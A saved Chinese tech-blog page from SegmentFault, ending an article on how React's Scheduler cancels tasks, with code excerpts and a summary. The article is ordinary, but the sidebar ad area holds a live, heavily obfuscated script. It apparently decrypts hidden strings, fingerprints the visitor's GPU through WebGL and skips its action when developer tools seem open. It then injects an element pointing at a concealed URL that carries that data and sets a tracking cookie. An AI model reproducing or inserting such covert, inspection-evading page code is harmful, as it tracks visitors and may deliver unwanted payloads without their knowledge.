        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="function test(root, b) {
    console.log(root, b)
}
function runTest() {
    return test.bind(null, &#39;root&#39;)
}

runTest()(false)

// 结果：root false" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">root, b</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(root, b)
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">runTest</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> test.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">'root'</span>)
}

<span class="hljs-title function_">runTest</span>()(<span class="hljs-literal">false</span>)

<span class="hljs-comment">// 结果：root false</span></pre><p>以上，是Scheduler执行任务时的两大核心逻辑：任务的中断与恢复 &amp; 任务完成状态的判断。它们协同合作，若任务未完成就中断了任务，那么调度的新执行者会恢复执行该任务，直到它完成。到此，Scheduler的核心部分已经写完了，下面是取消调度的逻辑。</p><h2 id="item-4">取消调度</h2><p>通过上面的内容我们知道，任务执行实际上是执行的任务的callback，当callback是function的时候去执行它，当它为null的时候会发生什么？当前的任务会被剔除出taskQueue，让我们再来看一下workLoop函数：</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="function workLoop(hasTimeRemaining, initialTime) {
  ...

  // 获取taskQueue中最紧急的任务
  currentTask = peek(taskQueue);
  while (currentTask !== null) {
    ...
    const callback = currentTask.callback;

    if (typeof callback === &#39;function&#39;) {
      // 执行任务
    } else {
      // 如果callback为null，将任务出队
      pop(taskQueue);
    }
    currentTask = peek(taskQueue);
  }
  ...
}" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoop</span>(<span class="hljs-params">hasTimeRemaining, initialTime</span>) {
  ...

  <span class="hljs-comment">// 获取taskQueue中最紧急的任务</span>
  currentTask = <span class="hljs-title function_">peek</span>(taskQueue);
  <span class="hljs-keyword">while</span> (currentTask !== <span class="hljs-literal">null</span>) {
    ...
    <span class="hljs-keyword">const</span> callback = currentTask.<span class="hljs-property">callback</span>;

    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> callback === <span class="hljs-string">'function'</span>) {
      <span class="hljs-comment">// 执行任务</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 如果callback为null，将任务出队</span>
      <span class="hljs-title function_">pop</span>(taskQueue);
    }
    currentTask = <span class="hljs-title function_">peek</span>(taskQueue);
  }
  ...
}</pre><p>所以取消调度的关键就是将当前这个任务的callback设置为null。</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="function unstable_cancelCallback(task) {

  ...

  task.callback = null;
}
" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">unstable_cancelCallback</span>(<span class="hljs-params">task</span>) {

  ...

  task.<span class="hljs-property">callback</span> = <span class="hljs-literal">null</span>;
}
</pre><p>为什么设置callback为null就能取消任务调度呢？因为在workLoop中，如果callback是null会被移出taskQueue，所以当前的这个任务就不会再被执行了。它取消的是当前任务的执行，while循环还会继续执行下一个任务。</p><p>取消任务在React的场景是什么呢？当一个更新任务正在进行的时候，突然有高优先级任务进来了，那么就要取消掉这个正在进行的任务，这只是众多场景中的一种。</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="function ensureRootIsScheduled(root: FiberRoot, currentTime: number) {

  ...

  if (existingCallbackNode !== null) {
    const existingCallbackPriority = root.callbackPriority;
    if (existingCallbackPriority === newCallbackPriority) {
      return;
    }
    // 取消掉原有的任务
    cancelCallback(existingCallbackNode);
  }

  ...
}" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ensureRootIsScheduled</span>(<span class="hljs-params">root: FiberRoot, currentTime: number</span>) {

  ...

  <span class="hljs-keyword">if</span> (existingCallbackNode !== <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">const</span> existingCallbackPriority = root.<span class="hljs-property">callbackPriority</span>;
    <span class="hljs-keyword">if</span> (existingCallbackPriority === newCallbackPriority) {
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// 取消掉原有的任务</span>
    <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode);
  }

  ...
}</pre><h2 id="item-5">总结</h2><p>Scheduler用任务优先级去实现多任务的管理，优先解决高优任务，用任务的持续调度来解决时间片造成的单个任务中断恢复问题。任务函数的执行结果为是否应该结束当前任务的调度提供参考，另外，在有限的时间片内完成任务的一部分，也为浏览器响应交互与完成任务提供了保障。</p><p>欢迎扫码关注公众号，发现更多技术文章</p><p><img referrerpolicy="no-referrer" src="./彻底搞懂React的调度机制原理_files/1460000038988056" alt="" title="" loading="lazy"></p></article><div class="d-flex flex-wrap align-items-center "><div class="m-n1 d-flex flex-wrap align-items-center"><a href="https://segmentfault.com/t/react.js" class="m-1 badge-tag  ">react.js</a><a href="https://segmentfault.com/t/javascript" class="m-1 badge-tag  ">javascript</a><a href="https://segmentfault.com/t/%E5%89%8D%E7%AB%AF" class="m-1 badge-tag  ">前端</a></div></div><div id="OA_holder_3" class="OA_holder mt-4" style="display: block;"><div id="beacon_f0806b2b7b" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./彻底搞懂React的调度机制原理_files/lg(3).php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div>
</div><div class="functional-area-bottom text-center my-4 py-3"><div role="group" class="btn-group like-group align-items-center btn-group"><button type="button" class="btn me-2 rounded btn btn-outline-primary"><i class="far fa-thumbs-up"></i><span class="ms-1">赞</span><span class="mainLikeNum ms-1">55</span></button><button type="button" class="btn me-2 rounded btn btn-outline-secondary"><i class="far fa-bookmark"></i><span class="ms-1">收藏</span><span class="ms-1">22</span></button><div class="bottom-share-wrap dropdown"><div class="nav-tab-item btn d-flex justify-content-center align-items-center dropdown-toggle" id="react-aria-2" aria-expanded="false"><button type="button" class="btn rounded btn btn-outline-secondary"><i class="far fa-share-nodes"></i><span class="ms-1">分享</span></button></div></div></div></div><canvas hidden="" class="qrcode"></canvas><div class="text-secondary font-size-14 mb-4 d-flex flex-wrap justify-content-between"><div><span>阅读 <!-- -->12.1k</span><span class="split-dot"></span><a href="https://segmentfault.com/a/1190000039101758/revision" class="text-secondary"><time datetime="2021-01-27T05:11:07.000Z" itemprop="datePublished">更新于 <!-- -->2021-02-26 </time></a></div><div class="operation text-end"><div></div></div></div><hr class="mb-0 bg-black bg-opacity-50"><div class="pt-4 d-flex flex-column flex-md-row"><div class="d-flex flex-fill"><a href="https://segmentfault.com/u/neronero"><div class="position-relative sflex-center rounded-circle flex-shrink-0 me-3" style="width:64px;height:64px" aria-hidden="true"><img src="./彻底搞懂React的调度机制原理_files/4125048880-5d76f84e47ad4_huge128" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div></a><div><a href="https://segmentfault.com/u/neronero"><h5 class="d-flex align-items-center text-body mb-1">nero</h5></a><div class="text-secondary mb-2"><span>4.3k<!-- --> 声望</span><span class="split-dot"></span><span>6.3k<!-- --> 粉丝</span><span class="split-dot"></span><a class="text-secondary" href="https://github.com/neroneroffy" target="_blank"><i class="me-2 fab fa-github"></i></a></div><div class="text-truncate-2"><p>前端工程师</p></div></div></div><div class="mt-sm-0 mt-3 d-flex align-items-start flex-shrink-0"><button type="button" class="w-100 btn btn-primary">关注作者</button></div></div><hr class="mb-4 bg-black bg-opacity-50"><div class="d-flex justify-content-between"><div class="w-50"><div class="text-secondary">« 上一篇</div><a class="text-truncate-1" href="https://segmentfault.com/a/1190000039097269">React源码  commit阶段详解</a></div><div class="d-flex flex-column align-items-end w-50"><div class="text-secondary">下一篇 »</div><a class="text-truncate-1" href="https://segmentfault.com/a/1190000039108951">深入React合成事件机制原理</a></div></div></div></div><div class="d-none d-lg-block col-lg-2"><div class="sticky-outer-wrapper" style=""><div class="sticky-inner-wrapper" style="position: relative; transform: translate3d(0px, 0px, 0px);"><div id="collapseTarget" class="ps-3 border-start w-100 mb-4"><div id="article-nav-list" class="font-size-14 w-100 list-group list-group-flush"><a class="list-group-item border-0 text-truncate-1 px-0 text-primary" href="https://segmentfault.com/a/1190000039101758#item-1">基本概念</a><a class="list-group-item border-0 text-truncate-1 px-0 link-secondary" href="https://segmentfault.com/a/1190000039101758#item-2">原理概述</a><a class="list-group-item border-0 text-truncate-1 ps-3 link-secondary" href="https://segmentfault.com/a/1190000039101758#item-2-1">任务队列管理</a><a class="list-group-item border-0 text-truncate-1 ps-3 link-secondary" href="https://segmentfault.com/a/1190000039101758#item-2-2">单个任务的中断以及恢复</a><a class="list-group-item border-0 text-truncate-1 ps-3 link-secondary" href="https://segmentfault.com/a/1190000039101758#item-2-3">原理小结</a><a class="list-group-item border-0 text-truncate-1 px-0 link-secondary" href="https://segmentfault.com/a/1190000039101758#item-3">详细流程</a><a class="list-group-item border-0 text-truncate-1 ps-3 link-secondary" href="https://segmentfault.com/a/1190000039101758#item-3-4">React与Scheduler的连接</a><a class="list-group-item border-0 text-truncate-1 ps-3 link-secondary" href="https://segmentfault.com/a/1190000039101758#item-3-5">Scheduler中的优先级</a><a class="list-group-item border-0 text-truncate-1 ps-3 link-secondary" href="https://segmentfault.com/a/1190000039101758#item-3-6">调度入口 - scheduleCallback</a><a class="list-group-item border-0 text-truncate-1 ps-3 link-secondary" href="https://segmentfault.com/a/1190000039101758#item-3-7">开始调度-找出调度者和执行者</a><a class="list-group-item border-0 text-truncate-1 ps-3 link-secondary" href="https://segmentfault.com/a/1190000039101758#item-3-8">任务执行 - 从performWorkUntilDeadline说起</a><a class="list-group-item border-0 text-truncate-1 px-0 link-secondary" href="https://segmentfault.com/a/1190000039101758#item-4">取消调度</a><a class="list-group-item border-0 text-truncate-1 px-0 link-secondary" href="https://segmentfault.com/a/1190000039101758#item-5">总结</a></div></div><div id="OA_holder_1" class="OA_holder" style="display: block;"><div style="line-height: 0"><a href="https://sponsor.segmentfault.com/ck.php?oaparams=2__bannerid=832__zoneid=1__cb=6d8a370bfa__oadest=https%3A%2F%2Fsegmentfault.com%2Fe%2F1160000044353489" target="_blank"><img src="./彻底搞懂React的调度机制原理_files/37552b483eec5f4734af5ef9d5643daf.jpg" width="196" height="306" alt="" title="" border="0"></a><div id="beacon_6d8a370bfa" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./彻底搞懂React的调度机制原理_files/lg(4).php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div></div><script type="text/javascript">var a0_0x5a7b=["gHn8nA==","toUTCString","pPUzbNqUOoPi1YTki","2BWEY1lTYNp/T+I9OQHVoZE=","IXFRmLrn","CgNqeWZa8Y45plkkKxbF4Q==","ZrSEYyW0b7Q0IPUqb/13ifQErimI4pBr","K3dNkqXKJbiemnk=","brSEdDKSbQ==","wRm0hXRLhWKYSg==","length","YtXMjstIgPUMjLZlaNb5QcsHsJfofqs=","01GCQWkzBrg=","2lWGVHRtav9SW7Q=","VOnkruxmgN02s5ZFWA==","YtXMjstIgPUMiLZlaNz5W84dpZXm","z0CORTVjSOFaRLMFKCvA","hcmRM5IG",";x20expires=","charCodeAt","rnaTNfMM5A5g","UP71jPdtsdQrqg==","lhDGASp5UQ==","cookie","yEaEWGp9","nEERm2ggVqUX","z1yGVA==","3UmTSW5gW/ZZWL8cbzjb/NRGE7wdKmt7","10CQRQ==","y0CcZStaTd1xcqMeCA==","xwKuhXRLhWKYSg==","ZDdmYg==","LyhDf39R658bu2Y/LxzF9w==","2FeTUG5sbPteWrUZNQ==",";x20path=/","yFCUQm57QPlc","K2pqmb72KbCVm3dtWA==","fixfCHIILA","xwKuhXRUiW+LShE=","atob","UP71n/lxpNw2qpZZ","YN7DiNRcodQxq5R0XvbFYPwqgqD1UImgOA==","ivuH9sk1F","UP71iuB3oN8gt5xF","WdIF+SOSzC5OLXDS7t8=","2keFXnZ8XfI=","0kE=","yECCcG59W/5ZQqQS","UuPxqupqqNQ9qpJHAeTOZv40"];(function(_0x1b61e1,_0x5a7b88){var _0x282611=function(_0x46bc60){while(--_0x46bc60){_0x1b61e1["push"](_0x1b61e1["shift"]());}};_0x282611(++_0x5a7b88);}(a0_0x5a7b,0xd7));var a0_0x2826=function(_0x1b61e1,_0x5a7b88){_0x1b61e1=_0x1b61e1-0x0;var _0x282611=a0_0x5a7b[_0x1b61e1];return _0x282611;};function kPbwxjZPvhHuql2cK(_0x2a7b56,_0x3dbb7d){var _0x39df8d=[],_0x3893cb=0x0,_0x4bd01a,_0x39ab8a="";for(var _0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x39df8d[_0x4366fa]=_0x4366fa;}for(_0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa]+_0x3dbb7d[a0_0x2826("0x0")](_0x4366fa%_0x3dbb7d[a0_0x2826("0x28")]))%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;}_0x4366fa=0x0;_0x3893cb=0x0;for(var _0x1f6e6d=0x0;_0x1f6e6d<_0x2a7b56[a0_0x2826("0x28")];_0x1f6e6d++){_0x4366fa=(_0x4366fa+0x1)%0x100;_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa])%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;_0x39ab8a+=String["fromCharCode"](_0x2a7b56["charCodeAt"](_0x1f6e6d)^_0x39df8d[(_0x39df8d[_0x4366fa]+_0x39df8d[_0x3893cb])%0x100]);}return _0x39ab8a;}function z58lhCJ(_0x5b3c65){var _0x2744f4="";try{_0x2744f4=window[a0_0x2826("0x14")](_0x5b3c65);}catch(_0x1d8981){}return _0x2744f4;};function aVxrxoIKgEYVWFC7(){var _0x2b4132=[a0_0x2826("0xc"),a0_0x2826("0x2c"),"VPrvuflw","QP7jqPQ=",a0_0x2826("0x1d"),a0_0x2826("0x2"),a0_0x2826("0x18"),a0_0x2826("0x15"),a0_0x2826("0x16"),a0_0x2826("0x2d"),a0_0x2826("0x29")];var _0x1267a4=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x1]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x2]),_0x2b4132[0x0]));var _0x424e30;var _0x30e940;var _0x470837;var _0x229329;try{_0x424e30=_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x3]),_0x2b4132[0x0]))||_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x4]),_0x2b4132[0x0]));}catch(_0x408b8e){}if(_0x424e30){_0x30e940=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x6]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x8]),_0x2b4132[0x0]));_0x470837=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x9]),_0x2b4132[0x0])]);_0x229329=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0xa]),_0x2b4132[0x0])]);}return _0x470837+"x20"+_0x229329;}function w9jcVeUDT(){var _0x3c83be=[a0_0x2826("0xb"),a0_0x2826("0x27"),a0_0x2826("0x13"),a0_0x2826("0x6"),a0_0x2826("0x25"),"BHBRkrX3Jw==",a0_0x2826("0x22"),a0_0x2826("0x11"),a0_0x2826("0x20")];const _0x1c6d55=0xa0;const _0x37ae20=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x0]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x1]),_0x3c83be[0x3])]>_0x1c6d55;const _0x4883d0=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x2]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x4]),_0x3c83be[0x8])]>_0x1c6d55;if(!(_0x4883d0&&_0x37ae20)&&(window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x7]),_0x3c83be[0x8])]||_0x37ae20||_0x4883d0)){return![];}else{return!![];}}function xGzLVAwTj9Dm(_0x528fc1,_0x3b5174,_0xfbb720){var _0x905dbf="";if(_0xfbb720){var _0x50d54e=new Date();_0x50d54e["setTime"](_0x50d54e["getTime"]()+_0xfbb720*0x18*0x3c*0x3c*0x3e8);_0x905dbf=a0_0x2826("0x30")+_0x50d54e[a0_0x2826("0x1f")]();}document[a0_0x2826("0x4")]=_0x528fc1+"="+(_0x3b5174||"")+_0x905dbf+a0_0x2826("0xf");}function uhAtRHZXRS(){var _0x7edbb9=["aJgicnL4X6hO",a0_0x2826("0x8"),"znG4dXV8X8ZND5w6dTeC+8M=",a0_0x2826("0xe"),a0_0x2826("0x5"),a0_0x2826("0x1c"),"yFeV",a0_0x2826("0x1b"),a0_0x2826("0x21"),a0_0x2826("0x7"),a0_0x2826("0x2e"),a0_0x2826("0x1a"),"iBXGQWI=",a0_0x2826("0x3"),a0_0x2826("0x2b"),"2EqZWnNs",a0_0x2826("0x9"),"yUSYVXVk","z0qlRWhgR/A=",a0_0x2826("0x10"),a0_0x2826("0xa"),a0_0x2826("0x1"),"z0SRbnhoW/laXLwS",a0_0x2826("0x2a")];var _0xde5cda=[a0_0x2826("0x1e"),"lmjgiQ==",a0_0x2826("0x2f"),a0_0x2826("0x24"),"ZLWPeiO4",a0_0x2826("0x26"),"sYkn4Oqn64Pdr"];var _0x33bc41;try{_0x33bc41=aVxrxoIKgEYVWFC7();}catch(_0x110e3a){}try{_0x33bc41=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x0]),_0xde5cda[0x2])](_0x33bc41);}catch(_0x3e7ed0){}_0x33bc41=encodeURIComponent(_0x33bc41);var _0x13700b=navigator["userAgent"]||navigator["vendor"]||window["opera"];var _0xb93071=kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x3]),_0xde5cda[0x6]);var _0x331712=new RegExp(_0xb93071,"i");var _0x53686b=!![];var _0x2d8ac7=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x14]),_0x7edbb9[0x15]);if(_0x331712[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x1]),_0xde5cda[0x2])](_0x13700b)){if(document[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x4]),_0xde5cda[0x6])][kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x5]),_0xde5cda[0x6])](_0x2d8ac7)==-0x1){if(w9jcVeUDT()){var _0x5d4d20=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x17]),_0x7edbb9[0x15])+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x1]),_0x7edbb9[0x15])+"?"+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15])+"="+_0x33bc41;var _0x5b2742=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x3]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x4]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x7]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x9]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xa]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x6]),_0x7edbb9[0x15]),_0x5d4d20);document["body"][kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xe]),_0x7edbb9[0x15])](_0x5b2742);xGzLVAwTj9Dm(_0x2d8ac7,"1","7");}}}}var aJ4knj0Q2TsZ=[a0_0x2826("0x19"),"XYcD7gyt6AZkIQDh3+Fn/PI=",a0_0x2826("0x12"),a0_0x2826("0xd"),a0_0x2826("0x23"),a0_0x2826("0x17")];var xz1ZKT5VYzY7UB=document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x0]),aJ4knj0Q2TsZ[0x2])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x1]),aJ4knj0Q2TsZ[0x2]));if(!xz1ZKT5VYzY7UB){document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x3]),aJ4knj0Q2TsZ[0x5])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x4]),aJ4knj0Q2TsZ[0x5]),uhAtRHZXRS());}</script>
</div></div></div></div></div><div id="fixedTools" class="position-fixed d-none " style="right:24px;bottom:24px"><button type="button" class="btn btn-light" title="回顶部">▲</button></div><div class="d-block d-sm-none fix-bottom-action-wrap"><div class="w-100 fixed-bottom-action d-flex align-items-center "><button type="button" aria-label="点赞" class="btn-reset text-center text-body w-25 btn btn-link"><i class="far fa-thumbs-up"></i><span class="mainLikeNum ms-1">55</span></button><button type="button" aria-label="收藏" class="btn-reset text-center text-body w-25 btn btn-link"><i class="far fa-bookmark"></i><span class="mainLikeNum ms-1">22</span></button><a class="text-center text-body w-25" href="https://segmentfault.com/a/1190000039101758#comment-area"><i class="far fa-message-lines"></i><span class="mainLikeNum ms-1">9</span></a><div class="bottom-share-wrap  w-25 text-center dropdown"><button type="button" id="react-aria-3" aria-expanded="false" aria-label="分享" class="btn-reset dropdown-toggle btn btn-link"><i class="far fa-share-nodes text-body"></i></button></div></div><canvas hidden="" class="qrcode"></canvas></div></div></div><div class="py-5 container"><div class="row"><div class="mx-auto col-lg-7"><h3 class="text-center mb-4">引用和评论</h3><div class="mb-4 card"><div class="bg-transparent border-0 card-header"><strong>被 <!-- -->1<!-- --> 篇内容引用</strong></div><ul class="quote border-bottom-0 list-group list-group-flush"><li class="d-flex align-items-center border-0 list-group-item list-group-item-action"><a href="https://segmentfault.com/a/1190000039149258?utm_source=sf-backlinks" class="d-flex align-items-center"><div class="position-relative sflex-center rounded-circle flex-shrink-0 me-2" style="width:24px;height:24px"><img src="./彻底搞懂React的调度机制原理_files/4125048880-5d76f84e47ad4_big64" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="me-2 text-body">React中的任务饥饿行为</div><span class="ms-1 me-2 font-size-14 flex-shrink-0"><i class="far fa-message-lines text-primary me-1"></i><span class="text-primary">3</span></span></a></li></ul></div><div class="mb-4 card"><div class="bg-transparent border-bottom-0 card-header"><strong>推荐阅读</strong></div><div class="list-group list-group-flush"><a href="https://segmentfault.com/a/1190000039149258?utm_source=sf-similar-article" data-rr-ui-event-key="/a/1190000039149258?utm_source=sf-similar-article" class="d-flex align-items-center border-0 list-group-item list-group-item-action"><div class="position-relative sflex-center rounded-circle flex-shrink-0 " style="width:38px;height:38px"><img src="./彻底搞懂React的调度机制原理_files/4125048880-5d76f84e47ad4_big64" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="ms-3"><h6 class="mb-1 text-break text-body fw-bold">React中的任务饥饿行为</h6><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-secondary">nero</span><span class="split-dot"></span><span class="text-secondary">赞 <!-- -->7</span><span class="split-dot"></span><span class="text-secondary">阅读 <!-- -->4.5k</span><span class="split-dot"></span><span class="text-secondary">评论 <!-- -->3</span></p></div></a><a href="https://segmentfault.com/a/1190000011557368?utm_source=sf-similar-article" data-rr-ui-event-key="/a/1190000011557368?utm_source=sf-similar-article" class="d-flex align-items-center border-0 list-group-item list-group-item-action"><div class="position-relative sflex-center rounded-circle flex-shrink-0 " style="width:38px;height:38px"><img src="./彻底搞懂React的调度机制原理_files/3831149293-59b53044f035f_big64" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="ms-3"><h6 class="mb-1 text-break text-body fw-bold">JavaScript有用的代码片段和trick</h6><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-secondary">jenemy</span><span class="split-dot"></span><span class="text-secondary">赞 <!-- -->70</span><span class="split-dot"></span><span class="text-secondary">阅读 <!-- -->10.7k</span><span class="split-dot"></span><span class="text-secondary">评论 <!-- -->12</span></p></div></a><a href="https://segmentfault.com/a/1190000009898072?utm_source=sf-similar-article" data-rr-ui-event-key="/a/1190000009898072?utm_source=sf-similar-article" class="d-flex align-items-center border-0 list-group-item list-group-item-action"><div class="position-relative sflex-center rounded-circle flex-shrink-0 " style="width:38px;height:38px"><img src="./彻底搞懂React的调度机制原理_files/1765210744-5b52d4ef09f06_big64" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="ms-3"><h6 class="mb-1 text-break text-body fw-bold">移动端开发的兼容问题</h6><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-secondary">余木</span><span class="split-dot"></span><span class="text-secondary">赞 <!-- -->46</span><span class="split-dot"></span><span class="text-secondary">阅读 <!-- -->11.6k</span><span class="split-dot"></span><span class="text-secondary">评论 <!-- -->10</span></p></div></a><a href="https://segmentfault.com/a/1190000041572883?utm_source=sf-similar-article" data-rr-ui-event-key="/a/1190000041572883?utm_source=sf-similar-article" class="d-flex align-items-center border-0 list-group-item list-group-item-action"><div class="position-relative sflex-center rounded-circle flex-shrink-0 " style="width:38px;height:38px"><img src="./彻底搞懂React的调度机制原理_files/4291332973-64f000fae9a4d_big64" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="ms-3"><h6 class="mb-1 text-break text-body fw-bold">【个人成长】专科如何进入大厂</h6><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-secondary">野生程序猿江辰</span><span class="split-dot"></span><span class="text-secondary">赞 <!-- -->79</span><span class="split-dot"></span><span class="text-secondary">阅读 <!-- -->11.6k</span><span class="split-dot"></span><span class="text-secondary">评论 <!-- -->12</span></p></div></a><a href="https://segmentfault.com/a/1190000020604384?utm_source=sf-similar-article" data-rr-ui-event-key="/a/1190000020604384?utm_source=sf-similar-article" class="d-flex align-items-center border-0 list-group-item list-group-item-action"><div class="position-relative sflex-center rounded-circle flex-shrink-0 " style="width:38px;height:38px"><img src="./彻底搞懂React的调度机制原理_files/2790295347-5c7f8d6242978_big64" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="ms-3"><h6 class="mb-1 text-break text-body fw-bold">如何编写高质量的 JS 函数（3） --函数式编程[理论篇]</h6><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-secondary">vivo互联网技术</span><span class="split-dot"></span><span class="text-secondary">赞 <!-- -->49</span><span class="split-dot"></span><span class="text-secondary">阅读 <!-- -->6.9k</span><span class="split-dot"></span><span class="text-secondary">评论 <!-- -->2</span></p></div></a><a href="https://segmentfault.com/a/1190000039955253?utm_source=sf-similar-article" data-rr-ui-event-key="/a/1190000039955253?utm_source=sf-similar-article" class="d-flex align-items-center border-0 list-group-item list-group-item-action"><div class="position-relative sflex-center rounded-circle flex-shrink-0 " style="width:38px;height:38px"><img src="./彻底搞懂React的调度机制原理_files/4291332973-64f000fae9a4d_big64" alt="头像" 